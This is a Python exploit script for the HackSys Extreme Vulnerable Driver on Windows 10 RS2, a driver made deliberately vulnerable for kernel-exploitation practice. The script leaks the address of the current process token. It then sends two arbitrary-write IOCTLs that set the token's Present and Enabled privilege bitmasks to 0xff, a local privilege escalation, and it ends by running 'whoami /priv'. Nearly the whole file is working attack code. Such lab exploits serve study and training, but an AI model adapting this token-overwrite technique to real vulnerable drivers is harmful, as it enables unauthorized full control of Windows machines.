#Purpose: HEVD - Arbitrary Overwrite - SEP_TOKEN_PRIVILEGES Overwrite (LPE)
#Platform: Windows 10 RS2
#Written By: Eric Van Zutphen

import os, subprocess, sys, struct
from ctypes import *
from ctypes.wintypes import *

# Functions proxy
kernel32 = windll.kernel32
ntdll = windll.ntdll

# Functions proxy
kernel32 = windll.kernel32
ntdll = windll.ntdll
ProcessStatusAPI = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

# Windows Common Data Types
NTSTATUS = DWORD
PHANDLE = POINTER(HANDLE)
PVOID = LPVOID = ULONG_PTR = c_void_p

# Constants
ObjectTypeInformation = 2
SystemExtendedHandleInformation = 64
STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_INVALID_HANDLE = 0xC0000008

class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]

class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]


# NTSTATUS WINAPI NtQuerySystemInformation(
#   _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
#   _Inout_   PVOID                    SystemInformation,
#   _In_      ULONG                    SystemInformationLength,
#   _Out_opt_ PULONG                   ReturnLength
# );
ntdll.NtQuerySystemInformation.argtypes = [DWORD, POINTER(SYSTEM_HANDLE_INFORMATION_EX), ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

# BOOL OpenProcessToken(
#  _In_opt_     HANDLE  ProcessHandle,
#  _In_         DWORD   DesiredAccess,
#  _Out_opt_    PHANDLE TokenHandle
#  );
advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype  = BOOL

def banner():
    logo = """
HEVD - HackSys Exteme Vulnerable Driver
Bug: Arbitrary Overwrite
Written By: Eric Van Zutphen
Platform: Windows 10 Red Stone 2
    """
    return logo

def debug_print(message):
    print(message)

    # void WINAPI OutputDebugString(
    #   _In_opt_ LPCTSTR lpOutputString
    # );

    kernel32.OutputDebugStringA(message + "\n")

def get_device_handle(device):
    open_existing = 0x3
    generic_read = 0x80000000
    generic_write = 0x40000000

    # HANDLE WINAPI CreateFile(
    #   _In_     LPCTSTR               lpFileName,
    #   _In_     DWORD                 dwDesiredAccess,
    #   _In_     DWORD                 dwShareMode,
    #   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    #   _In_     DWORD                 dwCreationDisposition,
    #   _In_     DWORD                 dwFlagsAndAttributes,
    #   _In_opt_ HANDLE                hTemplateFile
    # );

    # get the device handle
    handle = kernel32.CreateFileA(device,
                                  generic_read | generic_write,
                                  None,
                                  None,
                                  open_existing,
                                None,
                                  None)

    if not handle:
        debug_print("\t[-] Unable to get device handle")
        sys.exit(-1)
    return handle

def close_handle(handle):
    # BOOL WINAPI CloseHandle(
    #   _In_ HANDLE hObject
    # );

    # close the device handle
    return kernel32.CloseHandle(handle)

def  get_process_id():
    global process_id, handle
    process_handle = HANDLE(kernel32.GetCurrentProcess())
    process_id = kernel32.GetCurrentProcessId()
    debug_print("[+] Current PID: {0}".format(str(process_id)))
    handle = HANDLE()
    return_value = OpenProcessToken(process_handle, 0x8, byref(handle))
    if return_value == 1:
        debug_print("[+] Successfully Grabbed Handle: " + str(handle.value) + " For PID: " + str(process_id))
    else:
        debug_print("[+] Could Not Grab Handle!")
    return process_id, handle.value

def leak_handles():
    system_handle_info = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD(sizeof(system_handle_info))
    while True:
        query = ntdll.NtQuerySystemInformation(SystemExtendedHandleInformation, byref(system_handle_info) ,size,byref(size))
        if query == STATUS_SUCCESS:
            break
        elif query == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_info, size.value)
        else:
            raise Exception("NtQuerySystemInformation", hex(result))
    p_handles = cast(
    system_handle_info.Handles,
    POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * system_handle_info.NumberOfHandles)
    )
    for handle in p_handles.contents:
        yield handle.UniqueProcessId, handle.HandleValue, handle.Object

def get_handle_information(process_id, handle_value):
    for pid, handle, obj in leak_handles():
        if pid == process_id and handle == handle_value:
            debug_print(
                "[+] Token Address: {1}".format(
                    handle, hex(obj).rstrip("L")
                )
            )

            return obj

if __name__ == "__main__":

    #Constants
    debug_print(banner())
    bytes_returned = c_ulong()
    ioctl_arbitrary_overwrite = 0x0022200B
    device_name = "\\\\.\\HackSysExtremeVulnerableDriver"
    get_process_id()
    token = get_handle_information(process_id, handle.value)

    ring0_payload = "\xff" * 0x16
    ring0_payload_address = id(ring0_payload) + 32
    ring0_payload_pointer = struct.pack("L", ring0_payload_address)
    ring0_payload_pointer_address = id(ring0_payload_pointer) + 32
    priveleges = token +0x40

    www = WriteWhatWhere()
    www.What = ring0_payload_pointer_address
    www.Where = priveleges
    p_write_what_where = pointer(www)
    debug_print("[+] What : {0}".format(hex(www.What)))
    debug_print("[+] Where: {0}".format(hex(www.Where)))
    debug_print("[+] Sending Exploit to Vulnerable IOCTL: {0}".format(hex(ioctl_arbitrary_overwrite)))
    debug_print("[+] Overwriting Access Token: Present")
    device_handle = get_device_handle(device_name)
    success = kernel32.DeviceIoControl(device_handle,ioctl_arbitrary_overwrite,p_write_what_where,0x10,None,0,byref(bytes_returned),None)

    www = WriteWhatWhere()
    www.What = ring0_payload_pointer_address
    www.Where = priveleges +8
    p_write_what_where = pointer(www)
    debug_print("[+] What : {0}".format(hex(www.What)))
    debug_print("[+] Where: {0}".format(hex(www.Where)))
    debug_print("[+] Sending Exploit to Vulnerable IOCTL: {0}".format(hex(ioctl_arbitrary_overwrite)))
    debug_print("[+] Overwriting Access Token: Enabled")
    device_handle = get_device_handle(device_name)
    success = kernel32.DeviceIoControl(device_handle,ioctl_arbitrary_overwrite,p_write_what_where,0x10,None,0,byref(bytes_returned),None)
    halt = raw_input()
    # if we are here, then the trigger was unsuccessful
    # close the device handle
    debug_print("[+] Closing device handle")
    if not close_handle(device_handle):
        debug_print("\t[-] Unable to close device handle")
    debug_print("[+] Arbitrary Memory Overwrite Trigger Overwrite Completed")
    os.system('cmd.exe /c whoami /priv')
